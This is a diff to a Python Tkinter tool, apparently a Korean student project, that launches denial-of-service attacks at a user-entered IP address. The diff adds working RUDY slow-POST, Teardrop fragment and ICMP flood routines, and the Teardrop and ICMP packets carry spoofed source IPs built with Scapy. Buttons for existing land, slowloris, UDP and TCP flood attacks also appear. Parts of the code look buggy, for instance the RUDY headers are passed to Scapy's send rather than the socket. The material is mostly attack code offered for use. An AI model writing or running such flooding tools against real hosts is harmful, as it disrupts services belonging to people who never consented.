@@ -5,7 +5,8 @@ import threading
 import socket
 import sys
 import time
-
+import string
+import random
 
 class GUIMODE():
     def __init__(self):
@@ -16,8 +17,8 @@ class GUIMODE():
         win.geometry("800x600")
         win.resizable(False, False)
 
-        right_frame = tkinter.Frame(win, relief="groove", bd=1)
-        left_frame = tkinter.Frame(win, relief="groove", bd=1)
+        right_frame = tkinter.Frame(win, relief="raised", bd=1)
+        left_frame = tkinter.Frame(win, relief="raised", bd=1)
 
         right_frame.pack(side="right", fill="both", expand=True)
         left_frame.pack(side="left", fill="both", expand=True)
@@ -31,16 +32,16 @@ class GUIMODE():
         dos_manual=tkinter.Text(right_frame,width=50,height=50)
         dos_manual.insert(tkinter.CURRENT,"UDP 설명\n")
 
-        self.packet.grid(sticky='s', rowspan=1)
-        textbox.grid(sticky='s', rowspan=2)  # 텍스트 칸 위치 선정
-        dos_manual.grid(sticky='s')
+        self.packet.grid(sticky='N',row=0,column=0)
+        textbox.grid(sticky='sw', row=1,column=0)  # 텍스트 칸 위치 선정
+        dos_manual.grid(sticky='sw')
 
 
 
         self.dst_port = 80
         self.s_port = RandNum(1024, 65535)  # 포트 랜덤
         self.intercount = 0  # 카운터 재기
-        self.count = 30  # 몇번 반복할지 GUI 상에 설정
+        self.count = 5  # 몇번 반복할지 GUI 상에 설정
         self.Random = RandNum(1000, 9000)  # 무작위 설정 1000~9000
         self.s_ip = RandIP()
 
@@ -49,19 +50,23 @@ class GUIMODE():
 
 
 
-
         # 버튼 위젯 생성
-        land_button = Button(left_frame, text="land 공격문", command=self.land)
-        slowloris_button = Button(left_frame, text="slowloris 공격문", command=self.Slowloris)
-        udp_flood_button = Button(left_frame, text="udp_flood 공격문", command=self.udp_flood)
-        tcp_flood_button = Button(left_frame, text="tcp_flood 공격문", command=self.tcp_flood)
+        land_button = Button(left_frame, text="land 공격문", command=self.land,height=1,width=15)
+        slowloris_button = Button(left_frame, text="slowloris 공격문", command=self.Slowloris,height=1,width=15)
+        udp_flood_button = Button(left_frame, text="udp_flood 공격문", command=self.udp_flood,height=1,width=15)
+        tcp_flood_button = Button(left_frame, text="tcp_flood 공격문", command=self.tcp_flood,height=1,width=15)
+        rudy_button = Button(left_frame, text="rudy 공격문", command=self.rudy,height=1,width=15)
+        Teardrop_button = Button(left_frame, text="Teardrop 공격문", command=self.Teardrop,height=1,width=15)
+        ICMP_button = Button(left_frame, text="ICMP 공격문", command=self._ICMP,height=1,width=15)
 
         #버튼 위젯 위치 선언
-        land_button.grid(sticky='n', rowspan=2)
-        slowloris_button.grid(sticky='n', rowspan=3)
-        udp_flood_button.grid(sticky='n', rowspan=4)
-        tcp_flood_button.grid(sticky='n', rowspan=5)
-
+        land_button.grid(sticky='sw', row=2,column=0)
+        rudy_button.grid(sticky='sw', row=2,column=1)
+        slowloris_button.grid(sticky='sw', row=3,column=0)
+        udp_flood_button.grid(sticky='sw', row=3,column=1)
+        tcp_flood_button.grid(sticky='sw', row=4,column=0)
+        Teardrop_button.grid(sticky='sw', row=4,column=1)
+        ICMP_button.grid(sticky='sw', row=5,column=0)
 
 
 
@@ -82,12 +87,50 @@ class GUIMODE():
         f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "w")
         sys.stdout = f
         self.sniffing()
-        f.close
+
     def file_read(self):
         f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "r")
         lines = f.readlines()
         for _ in range(100):
             self.packet.configure(text=lines)
+
+    def rudy(self):
+        dst_ip = self.ip_dst_data.get()
+        useragents = [
+            "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+            "Accept-language: en-US,en"
+        ]
+
+        for i in range(self.count):
+
+            print("packet send {}".format(str(self.intercount)))
+
+            socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 생성
+            socks.connect((dst_ip, self.dst_port))  # ip 라는 인자값에 담긴 IP와 연결하고 80번 포트로 연결
+
+            send(bytes("Post /http/1.1\r\n", encoding="utf-8"))
+            send(
+                bytes("Host {}\r\n".format(dst_ip).encode("utf-8")))  # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.
+            send(bytes("User-agent {}\r\n".format(random.choice(useragents)).encode("utf-8")))
+            send(bytes("connection Keep-alive\r\n", encoding="utf-8"))
+            send(bytes("Keep-alive 900\r\n", encoding="utf-8"))
+            send(bytes("content Length 10000\r\n", encoding="utf-8"))
+            send(bytes("Content type application/x-www-form-urlencoded\r\n\r\n", encoding="utf-8"))
+            for i in range(0, 9000):
+                Random = random.choice(string.ascii_letters + string.digits).encode('utf-8')
+                socks.send(Random)
+            self.intercount += 1
+            socks.close()
+
+    def Teardrop(self):
+        dst_ip = self.ip_dst_data.get()
+        data=random.choice(string.ascii_letters + string.digits)
+        for i in range(self.count):
+            _id = random.choice(range(1, 65535))
+            send((IP(src=self.s_ip,dst=dst_ip,id=_id,flags="MF")/UDP(sport=self.s_port,dport=self.dst_port)/((data*1420))))
+            send((IP(src=self.s_ip,dst=dst_ip,id=_id,frag=130))/(data*1420))
+            send((IP(src=self.s_ip,dst=dst_ip,id=_id,flags="MF",frag=350)/UDP(sport=self.s_port,dport=self.dst_port)/(data*1420)))
+            send((IP(src=self.s_ip, dst=dst_ip, id=_id,flags=0, frag=520)/UDP(sport=self.s_port,dport=self.dst_port))/(data*1420))
 
     def Slowloris(self): # Slowloris 유주환
         dst_ip = self.ip_dst_data.get()
@@ -148,7 +191,13 @@ class GUIMODE():
         Packet_reading = threading.Thread(target=self.file_read)
         Packet_reading.start()
 
+    def _ICMP(self):
 
+        dst_ip = self.ip_dst_data.get()
+        data = (string.ascii_letters + string.digits)
+        for x in range(0, self.count):  # 보낼 패킷의 범위
+            icmpf=IP(src=self.s_ip,dst=dst_ip)/ICMP()/(data)*10
+            send(icmpf)  # ICMP 전송
     def land(self):   # land 김진
         dst_ip = self.ip_dst_data.get()
 
